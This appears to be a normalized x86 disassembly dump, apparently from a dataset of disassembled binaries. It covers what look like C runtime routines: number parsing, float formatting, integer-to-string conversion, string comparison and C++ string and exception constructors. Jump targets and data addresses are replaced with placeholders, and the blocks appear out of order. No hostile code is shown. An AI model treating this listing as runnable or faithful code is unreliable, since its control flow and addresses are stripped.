mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_40f66a ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40bc27
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40bc27
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40bc27
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40bc27
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40bc27
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_40f102
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_40fbc3
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_40f69a
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40fbc3
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40f9a3
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_40e2b0
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_40f0a7
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_40f0d5
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_40e2b0
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_40f0a7
lea eax [ ebp - 0x10 ]
push eax
call sub_40f0a7
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40f049
lea eax [ ebp - 0x10 ]
push eax
call sub_40f0a7
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_40f92d
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 8 + 0x4 ]
mov cl [ ecx + eax * 8 + 0x4 ]
test cl 0x1
je r-xdata
mov al cl
mov esi 0x8000
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
or eax 0xffffffff
pop esi
retn
sub_40f9a3
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_40f028
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40f0a7
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40f0d5
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_40fbc3
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_40f9a3
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_40fc40
mov eax sub_4106b4
call sub_410304
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_404100
mov esi r--data
push esi
call sub_40db20
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4082e0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_40fc9a
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_409349
pop esi
mov eax sub_4106c8
call sub_410304
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] r--data
call sub_410259
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_404100
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_40ff54
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40fc9a
mov eax sub_4106c8
call sub_410304
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] r--data
call sub_410259
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
push 0x0
mov al [ ebx ]
mov ecx edi
mov [ edi ] al
call sub_404100
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_40ff54
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40fd28
mov eax sub_4106dc
call sub_410304
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_404100
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4102e0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40fd81
mov eax sub_4106f0
call sub_410304
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
push ebx
mov [ ebp - 0x10 ] esi
call sub_410296
mov al [ ebx + 0xc ]
and [ ebp - 0x4 ] 0x0
add ebx 0xc
lea edi [ esi + 0xc ]
push 0x0
mov ecx edi
mov [ edi ] al
call sub_404100
push [ r--data ]
mov ecx edi
push 0x0
push ebx
call sub_40ff54
mov ecx [ ebp - 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40fdde
mov eax sub_410704
call sub_410304
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_404100
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4102e0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40fe1b
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_40fe54
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_409349
push esi
mov esi ecx
call sub_40fdde
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
pop ecx
sub_40fe6c
mov eax sub_410718
call sub_410304
sub esp 0x30
mov al [ ebp - 0xd ]
push esi
push 0x0
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] al
call sub_404100
mov esi r--data
push esi
call sub_40db20
pop ecx
push eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4082e0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x3c ]
call sub_40fc9a
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] r--data
call sub_409349
pop esi
sub_40fec6
mov eax sub_41072c
call sub_410304
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_404100
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4102e0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_40ff03
push ebp
mov ebp esp
sub esp 0x1c
push ecx
lea ecx [ ebp - 0x1c ]
call sub_40ff3c
lea eax [ ebp - 0x1c ]
push r--data
push eax
call sub_409349
push esi
mov esi ecx
call sub_40fec6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_408e5f
pop ecx
sub_40ff54
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
cmp [ ebx + 0x8 ] eax
jae r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov esi eax
sub esi ecx
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_40fe6c
cmp edi ebx
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jbe r-xdata
push [ r--data ]
add esi ecx
mov ecx edi
push esi
call sub_410022
push [ ebp + 0xc ]
mov ecx edi
push 0x0
call sub_410022
jmp r-xdata
push 0x1
push esi
mov ecx edi
call sub_404170
test al al
je r-xdata
cmp esi eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
add eax ecx
push eax
push [ edi + 0x4 ]
call sub_40b1f0
mov eax [ edi + 0x4 ]
add esp 0xc
mov [ edi + 0x8 ] esi
and [ eax + esi ] 0x0
mov eax r--data
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
push 0x1
mov ecx edi
call sub_404100
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x8 ] ecx
mov ecx [ ebx + 0xc ]
mov [ edi + 0xc ] ecx
inc [ eax - 0x1 ]
jmp r-xdata
mov eax r--data
sub_410022
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ edi + 0x8 ] esi
jae r-xdata
mov ecx edi
call sub_410089
mov eax [ edi + 0x8 ]
mov ebx [ esp + 0x14 ]
sub eax esi
cmp eax ebx
jae r-xdata
call sub_40fe6c
test ebx ebx
jbe r-xdata
mov ebx eax
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
mov ecx [ edi + 0x4 ]
sub eax ebx
add ecx esi
push eax
lea eax [ ecx + ebx ]
push eax
push ecx
call sub_408fa0
mov esi [ edi + 0x8 ]
add esp 0xc
sub esi ebx
mov ecx edi
push 0x0
push esi
call sub_404170
test al al
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] esi
and [ esi + eax ] 0x0
sub_410089
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
pop edi
pop esi
retn
mov al [ esi - 0x1 ]
test al al
je r-xdata
cmp al 0xff
je r-xdata
push 0x1
call sub_404100
push esi
call sub_40db20
pop ecx
push eax
push esi
mov ecx edi
call sub_4082e0
sub_410102
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41012f
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
sub_41012f
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_410190
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40ddeb
mov ebx eax
add esp 0x4
call sub_40ddeb
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
neg ecx
dec ecx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
